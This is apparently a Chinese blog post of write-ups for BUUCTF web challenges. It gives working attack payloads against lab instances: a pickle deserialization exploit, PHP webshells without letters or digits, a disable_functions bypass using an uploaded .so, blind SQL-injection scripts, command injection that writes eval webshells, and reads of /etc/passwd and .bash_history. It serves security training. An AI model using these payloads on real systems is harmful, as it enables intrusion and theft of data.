---
title: BUUCTF(四)
categories: ctf题目
---
# 前言
BUUCTF web 第三页 上半部分

# [CISCN2019 华北赛区 Day1 Web2]ikun

- Python反序列化 pickle

[浅谈python反序列化漏洞_Lethe's Blog-CSDN博客_python反序列化漏洞](https://blog.csdn.net/qq_42181428/article/details/103143526)

[Python安全之反序列化——pickle/cPickle - 云+社区 - 腾讯云 (tencent.com)](https://cloud.tencent.com/developer/article/1637531)

<!--more-->
--

注册登录

![](https://img-blog.csdnimg.cn/a02f7f3418aa483baa142d2d5fd2cca9.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
抓包发现jwt，破解出密钥

![](https://img-blog.csdnimg.cn/33442c92c89f4add87de4860db486784.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
修改admin，替换jwt

![](https://img-blog.csdnimg.cn/4121eb45c41a49e1877e4ea37dec83ea.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
看到提示要买v6

![](https://img-blog.csdnimg.cn/100c09994fb1421bb75aa4bc27b2cdb5.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
抓包修改折扣

![](https://img-blog.csdnimg.cn/185ab8e74966492d9e1c454792ca38be.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
发现后门

![](https://img-blog.csdnimg.cn/15d09020ddcb4125a5490aed793efcd5.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
下载
发现路径

![](https://img-blog.csdnimg.cn/5a6a95802eb24812b85a8102728fb8a2.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
跟进路由在代码中发现 `pickle.loads(urllib.unquote(become))` 很明显的 Python反序列化。

![](https://img-blog.csdnimg.cn/59f3eafbc25b48e9a6cd03d58d639e12.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

exp:

```
import os
import pickle
import urllib

class exp(object):
    def __reduce__(self):
        return (eval,("open('/flag.txt').read()",))

a=exp()
s=pickle.dumps(a)
print urllib.quote(s)
```

执行一下：python -2 exp.py

![](https://img-blog.csdnimg.cn/f5f78eca6afb4c90848cd2a61a8f6051.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
![](https://img-blog.csdnimg.cn/59efc22f479e4c72abb09975236ea98b.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
pickle：

![](https://img-blog.csdnimg.cn/8bf7e6ef7be54a3ab7eb78e12f0d86ca.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

---
# (x)[CISCN2019 华北赛区 Day1 Web1]Dropbox

注册登录，上传文件
有个下载和删除，考虑任意文件下载和删除
 
按照惯例和经验，我们上传的文件是放在网站主目录 `/sandbox/hash` 目录下的，所以要想下载源码php文件必须跳转到上级目录。fuzz之后：filename= ../../index.php

![](https://img-blog.csdnimg.cn/f8f05f2efce4455dad3b6c0b1e4c8169.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

下载了index.php,upload.php,register.php,login.php, download.php, delete.php

主要是 class.php：

![](https://img-blog.csdnimg.cn/240a46b60b9847bca946313e953a3dd1.png#pic_center)
发现利用点，但是我们不仅能读取到flag文件，还要回显

跟进

User类中：

![](https://img-blog.csdnimg.cn/af30b7dc2abb455d9adb76f27e4996b8.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
FileList类中：

![](https://img-blog.csdnimg.cn/0743eff7513a42189409e9014b1059fc.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
File类中：

![](https://img-blog.csdnimg.cn/240a46b60b9847bca946313e953a3dd1.png#pic_center)

FileList的 _call()方法语义，就是遍历files数组，对每一个file变量执行一次`$func`，然后将结果存进$results数组，

接下来的_destruct函数会将FileList对象的funcs变量和results数组中的内容以HTML表格的形式输出在index.php上（我们可以知道，index.php里创建了一个FileList对象，在脚本执行完毕后触发_destruct，则会输出该用户目录下的文件信息）


当执行`FileList->close()`时，因为FileList类中没有close()这个方法所以调用 FileList->_call() 从而遍历全文件找close()方法（这是因为_call() 函数的语义）找到了File->close()就执行了读取文件内容的操作`file_get_contents($filename)` 并给他的结果返回FileList->$results,最后FileList->_destruct()方法输出了这个结果，我们即可以通过这个思路拿到flag

---
# [MRCTF2020]套娃
```
$query = $_SERVER['QUERY_STRING'];

 if( substr_count($query, '_') !== 0 || substr_count($query, '%5f') != 0 ){
    die('Y0u are So cutE!');
}
 if($_GET['b_u_p_t'] !== '23333' && preg_match('/^23333$/', $_GET['b_u_p_t'])){
    echo "you are going to the next ~";
}
```

payload:
```
?b.u.p.t=23333%0a
```

回显：FLAG is in secrettw.php

发现一大段jsfuck，输入到浏览器console

弹框：post me Merak

得到：
```php
<?php 
error_reporting(0); 
include 'takeip.php';
ini_set('open_basedir','.'); 
include 'flag.php';

if(isset($_POST['Merak'])){ 
    highlight_file(__FILE__); 
    die(); 
} 


function change($v){ 
    $v = base64_decode($v); 
    $re = ''; 
    for($i=0;$i<strlen($v);$i++){ 
        $re .= chr ( ord ($v[$i]) + $i*2 ); 
    } 
    return $re; 
}
echo 'Local access only!'."<br/>";
$ip = getIp();
if($ip!='127.0.0.1')
echo "Sorry,you don't have permission!  Your ip is :".$ip;
if($ip === '127.0.0.1' && file_get_contents($_GET['2333']) === 'todat is a happy day' ){
echo "Your REQUEST is:".change($_GET['file']);
echo file_get_contents(change($_GET['file'])); }
?> 
```

解密脚本：
```php
<?php
function dechange($v){ 
    
    $re = ''; 
    for($i=0;$i<strlen($v);$i++){ 
        $re .= chr ( ord ($v[$i]) - $i*2 ); 
    } 
    return $re; 
}

$a=dechange('flag.php');
echo base64_encode($a);
?>
```
payload: 利用data协议
```
secrettw.php?2333=data:,todat%20is%20a%20happy%20day&file=ZmpdYSZmXGI=
```

同时要求ip为127，添加XFF不管用，添加 `Client-IP`

---
# ***[极客大挑战 2019]RCE ME
- 无参数RCE
- bypass_disable

```php
<?php
error_reporting(0);
if(isset($_GET['code'])){
    $code=$_GET['code'];
        if(strlen($code)>40){
            die("This is too Long.");
        }
        if(preg_match("/[A-Za-z0-9]+/",$code)){
            die("NO.");
        }
    @eval($code);
}
else{
    highlight_file(__FILE__);
}
?>  
```

无参数rce

[记一次拿webshell踩过的坑(如何用PHP编写一个不包含数字和字母的后门)](https://www.cnblogs.com/ECJTUACM-873284962/p/9433641.html)

[ctf中 preg_match 绕过技术 | 无字母数字的webshell ](https://www.cnblogs.com/v01cano/p/11736722.html)

[浅谈PHP代码执行中出现过滤限制的绕过执行方法_](https://blog.csdn.net/mochu7777777/article/details/104631142)

## 异或
显示字符与字符异或的结果

```
str = r"~!@#$%^&*()_+<>?,.;:-[]{}\/"

for i in range(0, len(str)):
    for j in range(0, len(str)):
        a = ord(str[i])^ord(str[j])
        print(str[i] + ' ^ ' + str[j] + ' is ' + chr(a))
```

## 取反

```php
<?php
$b='assert';
echo urlencode(~$b);
$a='(phpinfo())';
echo urlencode(~$a);
?>
```

结果：
```
(~%9E%8C%8C%9A%8D%8B)(~%D7%8F%97%8F%96%91%99%90%D7%D6%D6);
```

webshell
```php
<?php
$b='assert';
echo urlencode(~$b);
echo "\n";

$a='(eval($_POST[a]))';
echo urlencode(~$a);
?>
```

## 其他payload
```
code=${%fe%fe%fe%fe^%a1%b9%bb%aa}[_](${%fe%fe%fe%fe^%a1%b9%bb%aa}[__]);&_=assert&__=eval($_POST[%27cmd%27])
```

```
?code=$_="`{{{"^"?<>/";${$_}[_](${$_}[__]);&_=assert&__=eval($_GET[a])&a=phpinfo();
```

```
?code=${%fe%fe%fe%fe^%a1%b9%bb%aa}[_](${%fe%fe%fe%fe^%a1%b9%bb%aa}[__]);&_=assert&__=eval($_GET[a])&a=phpinfo();
```

```
${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}();&%ff=phpinfo
```

蚁剑连接后发现不能执行系统命令，那么应该是bypass_disablefunction()

![](https://img-blog.csdnimg.cn/d9a78d60cc2e47eeabb5bc66e8761dc0.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
看到根目录下存在flag文件，但是无权限执行，又发现一个 readflag

![](https://img-blog.csdnimg.cn/ba8dd48ae74a4cda8732c7b462c4caaa.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
反编译readflag文件，发现是通过这个文件来获取flag

![](https://img-blog.csdnimg.cn/b2612910ed884bdf8e7a9fb55d413be5.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
那么就要提升权限，绕过disable_functions

看几篇文章：

[bypass disable_function多种方法+实例](https://www.anquanke.com/post/id/208451#h2-4)

[PHP中通过bypass disable functions执行系统命令的几种方式](https://www.freebuf.com/articles/web/169156.html)

[bypass disable_function](https://blog.csdn.net/weixin_45551083/article/details/110200540)

[深入浅出LD_PRELOAD & putenv() ](https://www.anquanke.com/post/id/175403)

[Bypass disable_functions](https://www.youncyb.cn/?p=625)


上传恶意 so，以及php到tmp 目录下，html无权限上传

![](https://img-blog.csdnimg.cn/15a1a121520d49f290e2db357bf86ce5.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

利用前面的payload包含shell.php

payload:
```
?code=${%fe%fe%fe%fe^%a1%b9%bb%aa}[_](${%fe%fe%fe%fe^%a1%b9%bb%aa}[__]);
&_=assert&__=include('/var/tmp/shell.php')&cmd=/readflag
&outpath=/tmp/tmpfile&sopath=/var/tmp/bypass_disablefunc_x64.so

或

?code=$_=%22`{{{%22^%22?%3C%3E/%22;${$_}[_](${$_}[__]);&_=assert
&__=var_dump(eval($_GET[a]))&a=include(%27/tmp/123.php%27);&cmd=./../../../readflag
&outpath=/tmp/123.txt&sopath=/tmp/123.so
```

GC UAF：
利用的是PHP garbage collector程序中的堆溢出触发，影响范围为 `7.0-1.3`

上传php，直接include(shell2.php)

![](https://img-blog.csdnimg.cn/8dcbe9331cb8463386cd8b6fe835ecb7.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
蚁剑自带有bypass

![](https://img-blog.csdnimg.cn/66ea133dfb46461ca22e3d5c09627896.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

---
# [GWCTF 2019]枯燥的抽奖
- 伪随机数

F12 发现 check.php

```php
<?php
#这不是抽奖程序的源代码！不许看！
header("Content-Type: text/html;charset=utf-8");
session_start();
if(!isset($_SESSION['seed'])){
$_SESSION['seed']=rand(0,999999999);
}

mt_srand($_SESSION['seed']);
$str_long1 = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
$str='';
$len1=20;
for ( $i = 0; $i < $len1; $i++ ){
    $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       
}
$str_show = substr($str, 0, 10);
echo "<p id='p1'>".$str_show."</p>";


if(isset($_POST['num'])){
    if($_POST['num']===$str){x
        echo "<p id=flag>抽奖，就是那么枯燥且无味，给你flag{xxxxxxxxx}</p>";
    }
    else{
        echo "<p id=flag>没抽中哦，再试试吧</p>";
    }
}
show_source("check.php");
```

我们需要将给出前十个密码解析成 `php_mt_seed` 需要的参数（参考文章已给出exp)

[[GWCTF 2019]枯燥的抽奖_SopRomeo](https://blog.csdn.net/SopRomeo/article/details/105600636)

![](https://img-blog.csdnimg.cn/840e1385a1fa4ff5a7fdce8c2eb97dc7.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
去破解种子：

![](https://img-blog.csdnimg.cn/e900f37978284ad98c3f4d3efc1abc11.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

---
# [WUSTCTF2020]颜值成绩查询
- 二分法注入
- sql


if盲注，异或也行
```
?stunum=if(2>1,1,0)
if(length(database)>1,1,0)
```

二分法：

```
import requests

url = "http://08e01f48-6162-4c97-8c12-0f1df8dfacbe.node3.buuoj.cn/?stunum="

result = ""
i = 0

while (True):
    i = i + 1
    head = 32
    tail = 127

    while (head < tail):
        mid = (head + tail) >> 1

        # payload = "if(ascii(substr(database(),%d,1))>%d,1,0)" % (i , mid)
        payload = "if(ascii(substr((select/**/group_concat(table_name)from(information_schema.tables)where(table_schema=database())),%d,1))>%d,1,0)" % (
        i, mid)

        r = requests.get(url + payload)
        r.encoding = "utf-8"
        # print(url+payload)
        if "your score is: 100" in r.text:
            head = mid + 1
        else:
            # print(r.text)
            tail = mid

    last = result

    if head != 32:
        result += chr(head)
    else:
        break
    print(result)
```

```
import requests

url = 'http://b72a85e9-236a-4b72-b8f7-93bbd3f65b4f.node3.buuoj.cn/?stunum='

flag=''
for i in range(1,50):
    min=32
    max=125
    while 1:
        j=min+(max-min)//2
        if min==j:
            flag+=chr(j)
            print(flag)
            break

        payload="if(ascii(substr((select/**/value/**/from/**/flag),%d,1))<%d,1,2)"%(i,j)

        r=requests.get(url=url+payload).text
        #print(r)

        if 'admin' in r:
            max=j
        else :
            min=j
```

---
# [BSidesCF 2019]Kookie
以cookie身份登录

![](https://img-blog.csdnimg.cn/d9d53b606cc74cb0a7578629136d0270.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
发现cookie中的username为cookie，改为admin

---
# ***[FBCTF2019]RCEService
- preg_match的绕过姿势
- 关于路径和linux命令的相关知识

WP:  [Facebook CTF 2019 - Web ](https://xz.aliyun.com/t/5399)

开局一个框

![](https://img-blog.csdnimg.cn/2e8e085a489a4931b2e6c11c182127ac.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
需要使用JSON：JSON [数据格式 - SkySoot ](https://www.cnblogs.com/skysoot/archive/2012/04/17/2453010.html)

题目源码：
```
<?php

putenv('PATH=/home/rceservice/jail');

if (isset($_REQUEST['cmd'])) {
  $json = $_REQUEST['cmd'];

  if (!is_string($json)) {
    echo 'Hacking attempt detected<br/><br/>';
  } elseif (preg_match('/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/', $json)) {
    echo 'Hacking attempt detected<br/><br/>';
  } else {
    echo 'Attempting to run command:<br/>';
    $cmd = json_decode($json, true)['cmd'];
    if ($cmd !== NULL) {
      system($cmd);
    } else {
      echo 'Invalid input';
    }
    echo '<br/><br/>';
  }
}

?>
```

解法一：

1,	代码中使用 `putenv('PATH=/home/rceservice/jail');`  配置系统环境变量，而我们用不了 cat 也有可能是在这个环境变量下没有这个二进制文件。我们可以直接使用 `/bin/cat` 来调用cat命令。后来看到只有ls这个二进制文件

2,	Linux命令的位置：`/bin` 和 `/usr/bin`，默认都是全体用户使用，`/sbin`,`/usr/sbin`,默认root用户使用

3, `绕过preg_match` , 因为preg_match只会去匹配第一行，所以这里可以用`多行`进行绕过

payload
```
?cmd={%0A"cmd":"ls /home/rceservice/"%0A}

?cmd={%0A"cmd":"/bin/cat /home/rceservice/flag"%0A}
```

后来我就想会不会有echo 还有ls？
果然有，成功拿shell

```
/bin/echo '<?=phpinfo();' > 3.php

?cmd={%0A"cmd":"/bin/echo '<?=eval($_POST[shell]);' > 4.php"%0A}
```

解法二：利用PCRE回溯来绕过 preg_match

p神的文章：[PHP利用PCRE回溯次数限制绕过某些安全限制 | 离别歌 ](https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html)

```
import requests

url='http://5dd96313-13f8-4eb6-89eb-0dbb5a4ba30a.node3.buuoj.cn'
data={
    'cmd':'{"cmd":"/bin/cat /home/rceservice/flag","feng":"'+'a'*1000000+'"}'
}
r=requests.post(url=url,data=data).text
print(r)
```

---
# [CISCN2019 总决赛 Day2 Web1]Easyweb
robots.txt 得到网站源码

```
<?php
include 'config.php';
$id=isset($_GET["id"])?$_GET["id"]:"1";
$path=isset($_GET["path"])?$_GET["path"]:"";

$id=addslashes($id);
$path=addslashes($path);
$id=str_replace(array("\\0","%00","\\'","'"),"",$id);
$path=str_replace(array("\\0","%00","\\'","'"),"",$path);

$result=mysqli_query($con,"select * from images where id='{$id}' or path='{$path}'");
$row=mysqli_fetch_array($result,MYSQLI_ASSOC);

$path="./" . $row["path"];
header("Content-Type: image/jpeg");
readfile($path);

?>
```

直接给payload:
```
?id=\0&path=or if(length(database())>1,1,-1)%23
?id=\0'&path=or 1=1%23
```

addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。
```
单引号（'）
双引号（"）
反斜杠（\）
NULL
```
解释一下payload吧

?id=\0 经过 addslashes处理变为 `$id = \\0` 返回的是字符串，另外 `str_replace` 中的 `\\0`第一个斜杠其实是转义，真正去掉的是 `\0` 所以此时 `$id = \`

测试：

![](https://img-blog.csdnimg.cn/2cde8087971647ef90c2a866cc967ec4.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70)
拼接到sql语句后成为
```
select * from images where id=' \' or path=' or if(length(database())>1,1,-1)%23'
```

可见原本的单引号被转义为字符了，所以单引号现在包裹的是 `\' or path=` 后面拼接 or 语句实现了sql注入

脚本：

```
import  requests

url = "http://d4035b3f-eaac-4675-8c17-e1de75f3d193.node3.buuoj.cn/image.php?id=\\0&path="
payload = "or id=if(ascii(substr((select username from users),{0},1))>{1},1,0)%23"
result = ""
for i in range(1,100):
    l = 1
    r = 130
    mid = (l + r)>>1
    while(l<r):
        payloads = payload.format(i,mid)
        print(url+payloads)
        html = requests.get(url+payloads)
        if "JFIF" in html.text:
            l = mid +1
        else:
            r = mid
        mid = (l + r)>>1
    result+=chr(mid)
    print(result)
```

```
import requests
import time
name=''
for j in range(1,21):
    l = 32
    h = 127
    while abs(l-h)>1:
        i=int((l+h)/2)
        url="http://fde63acb-5720-46af-8abd-6a5b880c2d1d.node3.buuoj.cn/image.php?id=\\0'&path= or ascii(substr((select password from users),"+str(j)+",1))>"+str(i)+"%23"
        r = requests.get(url)
        time.sleep(0.005)
        if r.status_code=='429':
            print('to fast')
        if not 'Content-Length' in r.headers:
            l = i
        else:
            h = i
    name += chr(h)
print(name)
```

登陆后上传文件，返回说记录`文件名`到logs.php

Filename改为一句话，蚁剑 ls / -a 发现隐藏flag

![](https://img-blog.csdnimg.cn/542f7f5d43e740dba493f9f3a3d7890b.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

---
# [Zer0pts2020]Can you guess it?
- basename()

源码：
```php
<?php
include 'config.php'; // FLAG is defined in config.php

if (preg_match('/config\.php\/*$/i', $_SERVER['PHP_SELF'])) {
  exit("I don't know what you are thinking, but I won't let you read it :)");
}

if (isset($_GET['source'])) {
  highlight_file(basename($_SERVER['PHP_SELF']));
  exit();
}

$secret = bin2hex(random_bytes(64));
if (isset($_POST['guess'])) {
  $guess = (string) $_POST['guess'];
  if (hash_equals($secret, $guess)) {
    $message = 'Congratulations! The flag is: ' . FLAG;
  } else {
    $message = 'Wrong.';
  }
}
?>
```


要想拿到flag，需要

`basename($_SERVER['PHP_SELF'])=config.php`

所以直接这样写 `/index.php/config.php?scoure`，但是前面有pregmatch

config.php/(0个或多个/)就会exit，config.php/x(x任意)可以绕过正则，但是此时的

`basename($_SERVER['PHP_SELF'])` 就不是config.php了


但我们可以利用空字符串绕过正则：`basename()会去掉不可见字符，使用超过ascii码范围的字符就可以绕过`：

payload:
```
/index.php/config.php/%99?source
```

![](https://img-blog.csdnimg.cn/c718c83c3ea84a57b6d30b29242cacc9.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

---
# [CISCN2019 华北赛区 Day1 Web5]CyberPunk
- 二次注入

![](https://img-blog.csdnimg.cn/5cba230a780b4a528af2fb1cac6ffb7a.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70)


首页发现参数，尝试伪协议读取文件

![](https://img-blog.csdnimg.cn/5883f1ff0bbc4db4add1e89cb4fd8942.png#pic_center)

代码审计

在confirm.php中：

![](https://img-blog.csdnimg.cn/525e16511bd94594bede66b160798e61.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
对name phone都进行过滤，唯独没对address进行过滤并插入sql语句

在change.php中又查询旧地址，进行拼接：

![](https://img-blog.csdnimg.cn/3e6b4b338eb442b185d46b508724968e.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

且打印错误：

![](https://img-blog.csdnimg.cn/7b838b5b0e1c4b11bb2006baddc4d748.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
payload:
```
' and updatexml(1,concat(0x7e,right((select load_file('/flag.txt')),22),0x7e),1)#
```

---
# [网鼎杯 2018]Comment
- git泄露

![](https://img-blog.csdnimg.cn/8e351f282aaf41e5bc75df737f05bd76.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
发帖转到登录：

![](https://img-blog.csdnimg.cn/fda418cc101646128adcb36dd14c6674.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
弱口令zahngwei666

扫到 /.git  console也有提示：

![](https://img-blog.csdnimg.cn/11b26d36084c4d7a8628cba5e550c793.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
Githack下载后发现代码缺失，使用 `Githacker`

![](https://img-blog.csdnimg.cn/c5d1761623504a26bd653562910cbfa1.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
可以看到，head指针指向的是最早一次commit，通过 `git reset --hard e5b2a2443c2b6d395d06960123142bc91123148c ` 命令将head指向第一个commit，得到完整的write_do.php

```php
<?php
include "mysql.php";
session_start();
if($_SESSION['login'] != 'yes'){
    header("Location: ./login.php");
    die();
}
if(isset($_GET['do'])){
switch ($_GET['do'])
{
case 'write':
    $category = addslashes($_POST['category']);
    $title = addslashes($_POST['title']);
    $content = addslashes($_POST['content']);
    $sql = "insert into board
            set category = '$category',
                title = '$title',
                content = '$content'";
    $result = mysql_query($sql);
    header("Location: ./index.php");
    break;
case 'comment':
    $bo_id = addslashes($_POST['bo_id']);
    $sql = "select category from board where id='$bo_id'";
    $result = mysql_query($sql);
    $num = mysql_num_rows($result);
    if($num>0){
    $category = mysql_fetch_array($result)['category'];
    $content = addslashes($_POST['content']);
    $sql = "insert into comment
            set category = '$category',
                content = '$content',
                bo_id = '$bo_id'";
    $result = mysql_query($sql);
    }
    header("Location: ./comment.php?id=$bo_id");
    break;
default:
    header("Location: ./index.php");
}
}
else{
    header("Location: ./index.php");
}
?>
```

后台对输入的参数通过addslashes()对预定义字符进行转义，加上\ ，`但是放到数据库后会把转义符 \ 去掉（进入数据库后是没有反斜杠的），并存入数据库中`

而且取出时直接进行了拼接，没有进行addslanshes()
```php
$category = mysql_fetch_array($result)['category'];
    $content = addslashes($_POST['content']);
    $sql = "insert into comment
            set category = '$category',
```

那么可以这样构造 `$category = 0',content=database(),/*`  `$content = */#`
```php
insert into comment
            set category = '0',content=database(),/*,
                content = '*/#',
                bo_id = '$bo_id'
```

这样造成了二次注入

盲区：

读取/etc/passwd文件

```
a',content=(select (load_file('/etc/passwd'))),/*
```

![](https://img-blog.csdnimg.cn/539efcf4678e48eab4f4608ae7d3aa7c.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

看到有一个www的用户
```
www:x:500:500:www:/home/www:/bin/bash
```

![](https://img-blog.csdnimg.cn/4547e8e629904c54845fd1a166a84484.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70)
每个在系统中拥有账号的用户在他的目录下都有一个 `.bash_history` 文件，保存了当前用户使用过的历史命令，方便查找。

那就看一下历史吧
```
a',content=(select (load_file('/home/www/.bash_history'))),/*
```

![](https://img-blog.csdnimg.cn/df6b6aa81c3c48f3865ad940451790a4.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

